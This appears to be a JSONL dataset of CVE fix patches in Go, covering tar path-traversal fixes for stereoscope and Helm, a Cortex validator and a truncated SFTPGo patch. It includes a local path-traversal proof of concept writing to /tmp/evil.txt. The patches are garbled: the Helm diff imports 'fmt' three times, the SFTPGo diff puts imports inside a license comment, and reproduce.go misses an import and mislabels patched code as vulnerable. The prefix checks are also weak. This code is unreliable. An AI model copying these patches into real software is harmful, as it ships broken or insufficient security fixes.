validateSlackConfig(cfg config.SlackConfig) error {\n+        if cfg.APIURLFile != \"\" {\n+                return errSlackAPIURLFileNotAllowed\n+        }\n+        return nil\n+}\n+\n+// validateOpsGenieConfig validates the OpsGenie config and returns an error if it contains\n+// settings now allowed by Cortex.\n+func validateOpsGenieConfig(cfg config.OpsGenieConfig) error {\n+if cfg.APIKeyFile != \"\" {\n+return errOpsGenieAPIKeyFileNotAllowed\n+}\n+return nil\n+}\n+\n+// validateVictorOpsConfig validates the VictorOps config and returns an error if it contains\n+// settings now allowed by Cortex.\n+func validateVictorOpsConfig(cfg config.VictorOpsConfig) error {\n+        if cfg.APIKeyFile != \"\" {\n+                return errVictorOpsAPIKeyFileNotAllowed\n+        }\n+        return nil\n+}\n"}
{"cve":"CVE-2024-24579:0708", "fix_patch": "diff --git a/pkg/file/tarutil.go b/pkg/file/tarutil.go\nindex 374c60f..adbc463 100644\n--- a/pkg/file/tarutil.go\n+++ b/pkg/file/tarutil.go\n@@ -1,15 +1,16 @@\n package file\n \n import (\n-\t\"archive/tar\"\n-\t\"fmt\"\n-\t\"io\"\n-\t\"os\"\n-\t\"path/filepath\"\n+\"archive/tar\"\n+\"fmt\"\n+\"io\"\n+\"os\"\n+\"path/filepath\"\n+\"strings\"\n \n-\t\"github.com/pkg/errors\"\n+\"github.com/pkg/errors\"\n \n-\t\"github.com/anchore/stereoscope/internal/log\"\n+\"github.com/anchore/stereoscope/internal/log\"\n )\n \n const perFileReadLimit = 2 * GB\n@@ -18,15 +19,15 @@ var ErrTarStopIteration = fmt.Errorf(\"halt iterating tar\")\n \n // tarFile is a ReadCloser of a tar file on disk.\n type tarFile struct {\n-\tio.Reader\n-\tio.Closer\n+        io.Reader\n+        io.Closer\n }\n \n // TarFileEntry represents the header, contents, and list position of an entry within a tar file.\n type TarFileEntry struct {\n-\tSequence int64\n-\tHeader   tar.Header\n-\tReader   io.Reader\n+        Sequence int64\n+        Header   tar.Header\n+        Reader   io.Reader\n }\n \n // TarFileVisitor is a visitor function meant to be used in conjunction with the IterateTar.\n@@ -34,130 +35,134 @@ type TarFileVisitor func(TarFileEntry) error\n \n // ErrFileNotFound returned from ReaderFromTar if a file is not found in the given archive.\n type ErrFileNotFound struct {\n-\tPath string\n+        Path string\n }\n \n func (e *ErrFileNotFound) Error() string {\n-\treturn fmt.Sprintf(\"file not found (path=%s)\", e.Path)\n+        return fmt.Sprintf(\"file not found (path=%s)\", e.Path)\n }\n \n // IterateTar is a function that reads across a tar and invokes a visitor function for each entry discovered. The iterator\n // stops when there are no more entries to read, if there is an error in the underlying reader or visitor function,\n // or if the visitor function returns a ErrTarStopIteration sentinel error.\n func IterateTar(reader io.Reader, visitor TarFileVisitor) error {\n-\ttarReader := tar.NewReader(reader)\n-\tvar sequence int64 = -1\n-\tfor {\n-\t\tsequence++\n-\n-\t\thdr, err := tarReader.Next()\n-\t\tif errors.Is(err, io.EOF) {\n-\t\t\tbreak\n-\t\t}\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\tif hdr == nil {\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\tif err := visitor(TarFileEntry{\n-\t\t\tSequence: sequence,\n-\t\t\tHeader:   *hdr,\n-\t\t\tReader:   tarReader,\n-\t\t}); err != nil {\n-\t\t\tif errors.Is(err, ErrTarStopIteration) {\n-\t\t\t\treturn nil\n-\t\t\t}\n-\t\t\treturn fmt.Errorf(\"failed to visit tar entry=%q : %w\", hdr.Name, err)\n-\t\t}\n-\t}\n-\treturn nil\n+        tarReader := tar.NewReader(reader)\n+        var sequence int64 = -1\n+        for {\n+                sequence++\n+\n+                hdr, err := tarReader.Next()\n+                if errors.Is(err, io.EOF) {\n+                        break\n+                }\n+                if err != nil {\n+                        return err\n+                }\n+                if hdr == nil {\n+                        continue\n+                }\n+\n+                if err := visitor(TarFileEntry{\n+                        Sequence: sequence,\n+                        Header:   *hdr,\n+                        Reader:   tarReader,\n+                }); err != nil {\n+                        if errors.Is(err, ErrTarStopIteration) {\n+                                return nil\n+                        }\n+                        return fmt.Errorf(\"failed to visit tar entry=%q : %w\", hdr.Name, err)\n+                }\n+        }\n+        return nil\n }\n \n // ReaderFromTar returns a io.ReadCloser for the Path within a tar file.\n func ReaderFromTar(reader io.ReadCloser, tarPath string) (io.ReadCloser, error) {\n-\tvar result io.ReadCloser\n-\n-\tvisitor := func(entry TarFileEntry) error {\n-\t\tif entry.Header.Name == tarPath {\n-\t\t\tresult = &tarFile{\n-\t\t\t\tReader: entry.Reader,\n-\t\t\t\tCloser: reader,\n-\t\t\t}\n-\t\t\treturn ErrTarStopIteration\n-\t\t}\n-\t\treturn nil\n-\t}\n-\tif err := IterateTar(reader, visitor); err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tif result == nil {\n-\t\treturn nil, &ErrFileNotFound{tarPath}\n-\t}\n-\n-\treturn result, nil\n+        var result io.ReadCloser\n+\n+        visitor := func(entry TarFileEntry) error {\n+                if entry.Header.Name == tarPath {\n+                        result = &tarFile{\n+                                Reader: entry.Reader,\n+                                Closer: reader,\n+                        }\n+                        return ErrTarStopIteration\n+                }\n+                return nil\n+        }\n+        if err := IterateTar(reader, visitor); err != nil {\n+                return nil, err\n+        }\n+\n+        if result == nil {\n+                return nil, &ErrFileNotFound{tarPath}\n+        }\n+\n+        return result, nil\n }\n \n // MetadataFromTar returns the tar metadata from the header info.\n func MetadataFromTar(reader io.ReadCloser, tarPath string) (Metadata, error) {\n-\tvar metadata *Metadata\n-\tvisitor := func(entry TarFileEntry) error {\n-\t\tif entry.Header.Name == tarPath {\n-\t\t\tvar content io.Reader\n-\t\t\tif entry.Header.Size > 0 {\n-\t\t\t\tcontent = reader\n-\t\t\t}\n-\t\t\tm := NewMetadata(entry.Header, content)\n-\t\t\tmetadata = &m\n-\t\t\treturn ErrTarStopIteration\n-\t\t}\n-\t\treturn nil\n-\t}\n-\tif err := IterateTar(reader, visitor); err != nil {\n-\t\treturn Metadata{}, err\n-\t}\n-\tif metadata == nil {\n-\t\treturn Metadata{}, &ErrFileNotFound{tarPath}\n-\t}\n-\treturn *metadata, nil\n+        var metadata *Metadata\n+        visitor := func(entry TarFileEntry) error {\n+                if entry.Header.Name == tarPath {\n+                        var content io.Reader\n+                        if entry.Header.Size > 0 {\n+                                content = reader\n+                        }\n+                        m := NewMetadata(entry.Header, content)\n+                        metadata = &m\n+                        return ErrTarStopIteration\n+                }\n+                return nil\n+        }\n+        if err := IterateTar(reader, visitor); err != nil {\n+                return Metadata{}, err\n+        }\n+        if metadata == nil {\n+                return Metadata{}, &ErrFileNotFound{tarPath}\n+        }\n+        return *metadata, nil\n }\n \n // UntarToDirectory writes the contents of the given tar reader to the given destination\n func UntarToDirectory(reader io.Reader, dst string) error {\n-\tvisitor := func(entry TarFileEntry) error {\n-\t\ttarget := filepath.Join(dst, entry.Header.Name)\n-\n-\t\tswitch entry.Header.Typeflag {\n-\t\tcase tar.TypeDir:\n-\t\t\tif _, err := os.Stat(target); err != nil {\n-\t\t\t\tif err := os.MkdirAll(target, 0755); err != nil {\n-\t\t\t\t\treturn err\n-\t\t\t\t}\n-\t\t\t}\n-\n-\t\tcase tar.TypeReg:\n-\t\t\tf, err := os.OpenFile(target, os.O_CREATE|os.O_RDWR, os.FileMode(entry.Header.Mode))\n-\t\t\tif err != nil {\n-\t\t\t\treturn err\n-\t\t\t}\n-\n-\t\t\t// limit the reader on each file read to prevent decompression bomb attacks\n-\t\t\tnumBytes, err := io.Copy(f, io.LimitReader(entry.Reader, perFileReadLimit))\n-\t\t\tif numBytes >= perFileReadLimit || errors.Is(err, io.EOF) {\n-\t\t\t\treturn fmt.Errorf(\"zip read limit hit (potential decompression bomb attack)\")\n-\t\t\t}\n-\t\t\tif err != nil {\n-\t\t\t\treturn fmt.Errorf(\"unable to copy file: %w\", err)\n-\t\t\t}\n-\n-\t\t\tif err = f.Close(); err != nil {\n-\t\t\t\tlog.Errorf(\"failed to close file during untar of path=%q: %w\", f.Name(), err)\n-\t\t\t}\n-\t\t}\n-\t\treturn nil\n-\t}\n-\n-\treturn IterateTar(reader, visitor)\n+visitor := func(entry TarFileEntry) error {\n+target := filepath.Join(dst, entry.Header.Name)\n+\n+if !strings.HasPrefix(target, dst) {\n+return fmt.Errorf(\"tar entry %q is outside of the destination directory %q\", entry.Header.Name, dst)\n+}\n+\n+switch entry.Header.Typeflag {\n+case tar.TypeDir:\n+if _, err := os.Stat(target); err != nil {\n+if err := os.MkdirAll(target, 0755); err != nil {\n+return err\n+}\n+}\n+\n+case tar.TypeReg:\n+f, err := os.OpenFile(target, os.O_CREATE|os.O_RDWR, os.FileMode(entry.Header.Mode))\n+if err != nil {\n+return err\n+}\n+\n+// limit the reader on each file read to prevent decompression bomb attacks\n+numBytes, err := io.Copy(f, io.LimitReader(entry.Reader, perFileReadLimit))\n+if numBytes >= perFileReadLimit || errors.Is(err, io.EOF) {\n+return fmt.Errorf(\"zip read limit hit (potential decompression bomb attack)\")\n+}\n+if err != nil {\n+return fmt.Errorf(\"unable to copy file: %w\", err)\n+}\n+\n+if err = f.Close(); err != nil {\n+log.Errorf(\"failed to close file during untar of path=%q: %w\", f.Name(), err)\n+}\n+}\n+return nil\n+}\n+\n+return IterateTar(reader, visitor)\n }\ndiff --git a/pkg/file/tarutil.go.bak b/pkg/file/tarutil.go.bak\nnew file mode 100644\nindex 0000000..374c60f\n--- /dev/null\n+++ b/pkg/file/tarutil.go.bak\n@@ -0,0 +1,163 @@\n+package file\n+\n+import (\n+\t\"archive/tar\"\n+\t\"fmt\"\n+\t\"io\"\n+\t\"os\"\n+\t\"path/filepath\"\n+\n+\t\"github.com/pkg/errors\"\n+\n+\t\"github.com/anchore/stereoscope/internal/log\"\n+)\n+\n+const perFileReadLimit = 2 * GB\n+\n+var ErrTarStopIteration = fmt.Errorf(\"halt iterating tar\")\n+\n+// tarFile is a ReadCloser of a tar file on disk.\n+type tarFile struct {\n+\tio.Reader\n+\tio.Closer\n+}\n+\n+// TarFileEntry represents the header, contents, and list position of an entry within a tar file.\n+type TarFileEntry struct {\n+\tSequence int64\n+\tHeader   tar.Header\n+\tReader   io.Reader\n+}\n+\n+// TarFileVisitor is a visitor function meant to be used in conjunction with the IterateTar.\n+type TarFileVisitor func(TarFileEntry) error\n+\n+// ErrFileNotFound returned from ReaderFromTar if a file is not found in the given archive.\n+type ErrFileNotFound struct {\n+\tPath string\n+}\n+\n+func (e *ErrFileNotFound) Error() string {\n+\treturn fmt.Sprintf(\"file not found (path=%s)\", e.Path)\n+}\n+\n+// IterateTar is a function that reads across a tar and invokes a visitor function for each entry discovered. The iterator\n+// stops when there are no more entries to read, if there is an error in the underlying reader or visitor function,\n+// or if the visitor function returns a ErrTarStopIteration sentinel error.\n+func IterateTar(reader io.Reader, visitor TarFileVisitor) error {\n+\ttarReader := tar.NewReader(reader)\n+\tvar sequence int64 = -1\n+\tfor {\n+\t\tsequence++\n+\n+\t\thdr, err := tarReader.Next()\n+\t\tif errors.Is(err, io.EOF) {\n+\t\t\tbreak\n+\t\t}\n+\t\tif err != nil {\n+\t\t\treturn err\n+\t\t}\n+\t\tif hdr == nil {\n+\t\t\tcontinue\n+\t\t}\n+\n+\t\tif err := visitor(TarFileEntry{\n+\t\t\tSequence: sequence,\n+\t\t\tHeader:   *hdr,\n+\t\t\tReader:   tarReader,\n+\t\t}); err != nil {\n+\t\t\tif errors.Is(err, ErrTarStopIteration) {\n+\t\t\t\treturn nil\n+\t\t\t}\n+\t\t\treturn fmt.Errorf(\"failed to visit tar entry=%q : %w\", hdr.Name, err)\n+\t\t}\n+\t}\n+\treturn nil\n+}\n+\n+// ReaderFromTar returns a io.ReadCloser for the Path within a tar file.\n+func ReaderFromTar(reader io.ReadCloser, tarPath string) (io.ReadCloser, error) {\n+\tvar result io.ReadCloser\n+\n+\tvisitor := func(entry TarFileEntry) error {\n+\t\tif entry.Header.Name == tarPath {\n+\t\t\tresult = &tarFile{\n+\t\t\t\tReader: entry.Reader,\n+\t\t\t\tCloser: reader,\n+\t\t\t}\n+\t\t\treturn ErrTarStopIteration\n+\t\t}\n+\t\treturn nil\n+\t}\n+\tif err := IterateTar(reader, visitor); err != nil {\n+\t\treturn nil, err\n+\t}\n+\n+\tif result == nil {\n+\t\treturn nil, &ErrFileNotFound{tarPath}\n+\t}\n+\n+\treturn result, nil\n+}\n+\n+// MetadataFromTar returns the tar metadata from the header info.\n+func MetadataFromTar(reader io.ReadCloser, tarPath string) (Metadata, error) {\n+\tvar metadata *Metadata\n+\tvisitor := func(entry TarFileEntry) error {\n+\t\tif entry.Header.Name == tarPath {\n+\t\t\tvar content io.Reader\n+\t\t\tif entry.Header.Size > 0 {\n+\t\t\t\tcontent = reader\n+\t\t\t}\n+\t\t\tm := NewMetadata(entry.Header, content)\n+\t\t\tmetadata = &m\n+\t\t\treturn ErrTarStopIteration\n+\t\t}\n+\t\treturn nil\n+\t}\n+\tif err := IterateTar(reader, visitor); err != nil {\n+\t\treturn Metadata{}, err\n+\t}\n+\tif metadata == nil {\n+\t\treturn Metadata{}, &ErrFileNotFound{tarPath}\n+\t}\n+\treturn *metadata, nil\n+}\n+\n+// UntarToDirectory writes the contents of the given tar reader to the given destination\n+func UntarToDirectory(reader io.Reader, dst string) error {\n+\tvisitor := func(entry TarFileEntry) error {\n+\t\ttarget := filepath.Join(dst, entry.Header.Name)\n+\n+\t\tswitch entry.Header.Typeflag {\n+\t\tcase tar.TypeDir:\n+\t\t\tif _, err := os.Stat(target); err != nil {\n+\t\t\t\tif err := os.MkdirAll(target, 0755); err != nil {\n+\t\t\t\t\treturn err\n+\t\t\t\t}\n+\t\t\t}\n+\n+\t\tcase tar.TypeReg:\n+\t\t\tf, err := os.OpenFile(target, os.O_CREATE|os.O_RDWR, os.FileMode(entry.Header.Mode))\n+\t\t\tif err != nil {\n+\t\t\t\treturn err\n+\t\t\t}\n+\n+\t\t\t// limit the reader on each file read to prevent decompression bomb attacks\n+\t\t\tnumBytes, err := io.Copy(f, io.LimitReader(entry.Reader, perFileReadLimit))\n+\t\t\tif numBytes >= perFileReadLimit || errors.Is(err, io.EOF) {\n+\t\t\t\treturn fmt.Errorf(\"zip read limit hit (potential decompression bomb attack)\")\n+\t\t\t}\n+\t\t\tif err != nil {\n+\t\t\t\treturn fmt.Errorf(\"unable to copy file: %w\", err)\n+\t\t\t}\n+\n+\t\t\tif err = f.Close(); err != nil {\n+\t\t\t\tlog.Errorf(\"failed to close file during untar of path=%q: %w\", f.Name(), err)\n+\t\t\t}\n+\t\t}\n+\t\treturn nil\n+\t}\n+\n+\treturn IterateTar(reader, visitor)\n+}\n"}
{"cve":"CVE-2020-4053:0708", "fix_patch": "diff --git a/pkg/plugin/installer/http_installer.go b/pkg/plugin/installer/http_installer.go\nindex c07cad80a..2c1fe7d70 100644\n--- a/pkg/plugin/installer/http_installer.go\n+++ b/pkg/plugin/installer/http_installer.go\n@@ -16,31 +16,35 @@ limitations under the License.\n package installer // import \"helm.sh/helm/v3/pkg/plugin/installer\"\n \n import (\n-\t\"archive/tar\"\n-\t\"bytes\"\n-\t\"compress/gzip\"\n-\t\"io\"\n-\t\"os\"\n-\t\"path/filepath\"\n-\t\"regexp\"\n-\t\"strings\"\n-\n-\t\"github.com/pkg/errors\"\n-\n-\t\"helm.sh/helm/v3/internal/third_party/dep/fs\"\n-\t\"helm.sh/helm/v3/pkg/cli\"\n-\t\"helm.sh/helm/v3/pkg/getter\"\n-\t\"helm.sh/helm/v3/pkg/helmpath\"\n-\t\"helm.sh/helm/v3/pkg/plugin/cache\"\n+        \"archive/tar\"\n+        \"bytes\"\n+\"fmt\"\n+        \"compress/gzip\"\n+\"fmt\"\n+\n+        \"io\"\n+        \"os\"\n+        \"path/filepath\"\n+        \"regexp\"\n+        \"strings\"\n+\n+        \"github.com/pkg/errors\"\n+\n+        \"helm.sh/helm/v3/internal/third_party/dep/fs\"\n+        \"helm.sh/helm/v3/pkg/cli\"\n+        \"helm.sh/helm/v3/pkg/getter\"\n+        \"helm.sh/helm/v3/pkg/helmpath\"\n+        \"helm.sh/helm/v3/pkg/plugin/cache\"\n )\n+import \"fmt\"\n \n // HTTPInstaller installs plugins from an archive served by a web server.\n type HTTPInstaller struct {\n-\tCacheDir   string\n-\tPluginName string\n-\tbase\n-\textractor Extractor\n-\tgetter    getter.Getter\n+        CacheDir   string\n+        PluginName string\n+        base\n+        extractor Extractor\n+        getter    getter.Getter\n }\n \n // TarGzExtractor extracts gzip compressed tar archives\n@@ -48,63 +52,63 @@ type TarGzExtractor struct{}\n \n // Extractor provides an interface for extracting archives\n type Extractor interface {\n-\tExtract(buffer *bytes.Buffer, targetDir string) error\n+        Extract(buffer *bytes.Buffer, targetDir string) error\n }\n \n // Extractors contains a map of suffixes and matching implementations of extractor to return\n var Extractors = map[string]Extractor{\n-\t\".tar.gz\": &TarGzExtractor{},\n-\t\".tgz\":    &TarGzExtractor{},\n+        \".tar.gz\": &TarGzExtractor{},\n+        \".tgz\":    &TarGzExtractor{},\n }\n \n // NewExtractor creates a new extractor matching the source file name\n func NewExtractor(source string) (Extractor, error) {\n-\tfor suffix, extractor := range Extractors {\n-\t\tif strings.HasSuffix(source, suffix) {\n-\t\t\treturn extractor, nil\n-\t\t}\n-\t}\n-\treturn nil, errors.Errorf(\"no extractor implemented yet for %s\", source)\n+        for suffix, extractor := range Extractors {\n+                if strings.HasSuffix(source, suffix) {\n+                        return extractor, nil\n+                }\n+        }\n+        return nil, errors.Errorf(\"no extractor implemented yet for %s\", source)\n }\n \n // NewHTTPInstaller creates a new HttpInstaller.\n func NewHTTPInstaller(source string) (*HTTPInstaller, error) {\n-\tkey, err := cache.Key(source)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\textractor, err := NewExtractor(source)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tget, err := getter.All(new(cli.EnvSettings)).ByScheme(\"http\")\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\ti := &HTTPInstaller{\n-\t\tCacheDir:   helmpath.CachePath(\"plugins\", key),\n-\t\tPluginName: stripPluginName(filepath.Base(source)),\n-\t\tbase:       newBase(source),\n-\t\textractor:  extractor,\n-\t\tgetter:     get,\n-\t}\n-\treturn i, nil\n+        key, err := cache.Key(source)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        extractor, err := NewExtractor(source)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        get, err := getter.All(new(cli.EnvSettings)).ByScheme(\"http\")\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        i := &HTTPInstaller{\n+                CacheDir:   helmpath.CachePath(\"plugins\", key),\n+                PluginName: stripPluginName(filepath.Base(source)),\n+                base:       newBase(source),\n+                extractor:  extractor,\n+                getter:     get,\n+        }\n+        return i, nil\n }\n \n // helper that relies on some sort of convention for plugin name (plugin-name-<version>)\n func stripPluginName(name string) string {\n-\tvar strippedName string\n-\tfor suffix := range Extractors {\n-\t\tif strings.HasSuffix(name, suffix) {\n-\t\t\tstrippedName = strings.TrimSuffix(name, suffix)\n-\t\t\tbreak\n-\t\t}\n-\t}\n-\tre := regexp.MustCompile(`(.*)-[0-9]+\\..*`)\n-\treturn re.ReplaceAllString(strippedName, `$1`)\n+        var strippedName string\n+        for suffix := range Extractors {\n+                if strings.HasSuffix(name, suffix) {\n+                        strippedName = strings.TrimSuffix(name, suffix)\n+                        break\n+                }\n+        }\n+        re := regexp.MustCompile(`(.*)-[0-9]+\\..*`)\n+        return re.ReplaceAllString(strippedName, `$1`)\n }\n \n // Install downloads and extracts the tarball into the cache directory\n@@ -112,88 +116,91 @@ func stripPluginName(name string) string {\n //\n // Implements Installer.\n func (i *HTTPInstaller) Install() error {\n-\tpluginData, err := i.getter.Get(i.Source)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tif err := i.extractor.Extract(pluginData, i.CacheDir); err != nil {\n-\t\treturn err\n-\t}\n-\n-\tif !isPlugin(i.CacheDir) {\n-\t\treturn ErrMissingMetadata\n-\t}\n-\n-\tsrc, err := filepath.Abs(i.CacheDir)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tdebug(\"copying %s to %s\", src, i.Path())\n-\treturn fs.CopyDir(src, i.Path())\n+        pluginData, err := i.getter.Get(i.Source)\n+        if err != nil {\n+                return err\n+        }\n+\n+        if err := i.extractor.Extract(pluginData, i.CacheDir); err != nil {\n+                return err\n+        }\n+\n+        if !isPlugin(i.CacheDir) {\n+                return ErrMissingMetadata\n+        }\n+\n+        src, err := filepath.Abs(i.CacheDir)\n+        if err != nil {\n+                return err\n+        }\n+\n+        debug(\"copying %s to %s\", src, i.Path())\n+        return fs.CopyDir(src, i.Path())\n }\n \n // Update updates a local repository\n // Not implemented for now since tarball most likely will be packaged by version\n func (i *HTTPInstaller) Update() error {\n-\treturn errors.Errorf(\"method Update() not implemented for HttpInstaller\")\n+        return errors.Errorf(\"method Update() not implemented for HttpInstaller\")\n }\n \n // Path is overridden because we want to join on the plugin name not the file name\n func (i HTTPInstaller) Path() string {\n-\tif i.base.Source == \"\" {\n-\t\treturn \"\"\n-\t}\n-\treturn helmpath.DataPath(\"plugins\", i.PluginName)\n+        if i.base.Source == \"\" {\n+                return \"\"\n+        }\n+        return helmpath.DataPath(\"plugins\", i.PluginName)\n }\n \n // Extract extracts compressed archives\n //\n // Implements Extractor.\n func (g *TarGzExtractor) Extract(buffer *bytes.Buffer, targetDir string) error {\n-\tuncompressedStream, err := gzip.NewReader(buffer)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tif err := os.MkdirAll(targetDir, 0755); err != nil {\n-\t\treturn err\n-\t}\n-\n-\ttarReader := tar.NewReader(uncompressedStream)\n-\tfor {\n-\t\theader, err := tarReader.Next()\n-\t\tif err == io.EOF {\n-\t\t\tbreak\n-\t\t}\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\n-\t\tpath := filepath.Join(targetDir, header.Name)\n-\n-\t\tswitch header.Typeflag {\n-\t\tcase tar.TypeDir:\n-\t\t\tif err := os.Mkdir(path, 0755); err != nil {\n-\t\t\t\treturn err\n-\t\t\t}\n-\t\tcase tar.TypeReg:\n-\t\t\toutFile, err := os.OpenFile(path, os.O_CREATE|os.O_RDWR, os.FileMode(header.Mode))\n-\t\t\tif err != nil {\n-\t\t\t\treturn err\n-\t\t\t}\n-\t\t\tif _, err := io.Copy(outFile, tarReader); err != nil {\n-\t\t\t\toutFile.Close()\n-\t\t\t\treturn err\n-\t\t\t}\n-\t\t\toutFile.Close()\n-\t\t// We don't want to process these extension header files.\n-\t\tcase tar.TypeXGlobalHeader, tar.TypeXHeader:\n-\t\t\tcontinue\n-\t\tdefault:\n-\t\t\treturn errors.Errorf(\"unknown type: %b in %s\", header.Typeflag, header.Name)\n-\t\t}\n-\t}\n-\treturn nil\n+        uncompressedStream, err := gzip.NewReader(buffer)\n+        if err != nil {\n+                return err\n+        }\n+\n+        if err := os.MkdirAll(targetDir, 0755); err != nil {\n+                return err\n+        }\n+\n+        tarReader := tar.NewReader(uncompressedStream)\n+        for {\n+                header, err := tarReader.Next()\n+                if err == io.EOF {\n+                        break\n+                }\n+                if err != nil {\n+                        return err\n+                }\n+\n+                path := filepath.Join(targetDir, header.Name)\n+if !strings.HasPrefix(path, filepath.Clean(targetDir)) {\n+return fmt.Errorf(\"content of plugin has invalid path %q\", header.Name)\n+}\n+\n+                switch header.Typeflag {\n+                case tar.TypeDir:\n+                        if err := os.Mkdir(path, 0755); err != nil {\n+                                return err\n+                        }\n+                case tar.TypeReg:\n+                        outFile, err := os.OpenFile(path, os.O_CREATE|os.O_RDWR, os.FileMode(header.Mode))\n+                        if err != nil {\n+                                return err\n+                        }\n+                        if _, err := io.Copy(outFile, tarReader); err != nil {\n+                                outFile.Close()\n+                                return err\n+                        }\n+                        outFile.Close()\n+                // We don't want to process these extension header files.\n+                case tar.TypeXGlobalHeader, tar.TypeXHeader:\n+                        continue\n+                default:\n+                        return errors.Errorf(\"unknown type: %b in %s\", header.Typeflag, header.Name)\n+                }\n+        }\n+        return nil\n }\ndiff --git a/reproduce_vulnerability/reproduce.go b/reproduce_vulnerability/reproduce.go\nnew file mode 100644\nindex 000000000..9210ef39e\n--- /dev/null\n+++ b/reproduce_vulnerability/reproduce.go\n@@ -0,0 +1,117 @@\n+\n+package main\n+\n+import (\n+    \"archive/tar\"\n+    \"bytes\"\n+    \"compress/gzip\"\n+    \"fmt\"\n+    \"io\"\n+    \"log\"\n+\"strings\"\n+\n+    \"os\"\n+    \"path/filepath\"\n+)\n+\n+func main() {\n+    // Create a temporary directory for the test\n+    tmpDir, err := os.MkdirTemp(\"\", \"helm-plugin-test\")\n+    if err != nil {\n+        log.Fatal(err)\n+    }\n+    defer os.RemoveAll(tmpDir)\n+\n+    // Create a malicious tar.gz file with a path traversal\n+    var buf bytes.Buffer\n+    gw := gzip.NewWriter(&buf)\n+    tw := tar.NewWriter(gw)\n+\n+    // Add a file with a path traversal\n+    maliciousPath := \"../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../tmp/evil.txt\"\n+    fileContent := []byte(\"evil file\")\n+    hdr := &tar.Header{\n+        Name: maliciousPath,\n+        Mode: 0644,\n+        Size: int64(len(fileContent)),\n+    }\n+    if err := tw.WriteHeader(hdr); err != nil {\n+        log.Fatal(err)\n+    }\n+    if _, err := tw.Write(fileContent); err != nil {\n+        log.Fatal(err)\n+    }\n+\n+    if err := tw.Close(); err != nil {\n+        log.Fatal(err)\n+    }\n+    if err := gw.Close(); err != nil {\n+        log.Fatal(err)\n+    }\n+\n+    // Call the vulnerable Extract function\n+    err = Extract(&buf, tmpDir)\n+    if err != nil {\n+        log.Fatal(err)\n+    }\n+\n+    // Check if the file was created outside the target directory\n+    if _, err := os.Stat(\"/tmp/evil.txt\"); err == nil {\n+        fmt.Println(\"Vulnerability confirmed: /tmp/evil.txt created\")\n+        os.Remove(\"/tmp/evil.txt\")\n+    } else {\n+        fmt.Println(\"Vulnerability not reproduced\")\n+    }\n+}\n+\n+// NOTE: This is a simplified version of the vulnerable function from\n+// pkg/plugin/installer/http_installer.go\n+func Extract(buffer *bytes.Buffer, targetDir string) error {\n+    uncompressedStream, err := gzip.NewReader(buffer)\n+    if err != nil {\n+        return err\n+    }\n+\n+    if err := os.MkdirAll(targetDir, 0755); err != nil {\n+        return err\n+    }\n+\n+    tarReader := tar.NewReader(uncompressedStream)\n+    for {\n+        header, err := tarReader.Next()\n+        if err == io.EOF {\n+            break\n+        }\n+        if err != nil {\n+            return err\n+        }\n+\n+        path := filepath.Join(targetDir, header.Name)\n+        if !strings.HasPrefix(path, filepath.Clean(targetDir)) {\n+            return fmt.Errorf(\"content of plugin has invalid path %q\", header.Name)\n+        }\n+\n+        switch header.Typeflag {\n+        case tar.TypeDir:\n+            if err := os.Mkdir(path, 0755); err != nil {\n+                return err\n+            }\n+        case tar.TypeReg:\n+            outFile, err := os.OpenFile(path, os.O_CREATE|os.O_RDWR, os.FileMode(header.Mode))\n+            if err != nil {\n+                return err\n+            }\n+            if _, err := io.Copy(outFile, tarReader); err != nil {\n+                outFile.Close()\n+                return err\n+            }\n+            outFile.Close()\n+        // We don't want to process these extension header files.\n+        case tar.TypeXGlobalHeader, tar.TypeXHeader:\n+            continue\n+        default:\n+            return errors.Errorf(\"unknown type: %b in %s\", header.Typeflag, header.Name)\n+        }\n+    }\n+    return nil\n+}\n"}
{"cve":"CVE-2025-24366:0708", "fix_patch": "diff --git a/internal/sftpd/ssh_cmd.go b/internal/sftpd/ssh_cmd.go\nindex 8a342e99..87550d7a 100644\n--- a/internal/sftpd/ssh_cmd.go\n+++ b/internal/sftpd/ssh_cmd.go\n@@ -4,6 +4,9 @@\n // it under the terms of the GNU Affero General Public License as published\n // by the Free Software Foundation, version 3.\n //\n+\"fmt\"\n+\"strings\"\n+\"fmt\"\n // This program is distributed in the hope that it will be useful,\n // but WITHOUT ANY WARRANTY; without even the implied warranty of\n // MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n@@ -15,598 +18,743 @@\n package sftpd\n \n import 